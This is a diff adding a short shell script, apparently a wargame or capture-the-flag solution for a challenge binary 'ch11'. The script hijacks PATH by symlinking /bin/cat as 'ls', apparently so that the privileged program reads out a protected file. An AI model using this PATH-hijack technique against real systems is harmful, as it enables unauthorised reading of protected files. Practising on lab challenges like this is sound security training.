@@ -1,0 +1,7 @@
+mkdir /tmp/gbourgeo3
+ln -s /bin/cat /tmp/gbourgeo3/ls
+export PATH=/tmp/gbourgeo3:$PATH
+./ch11
+
+DONE!
+
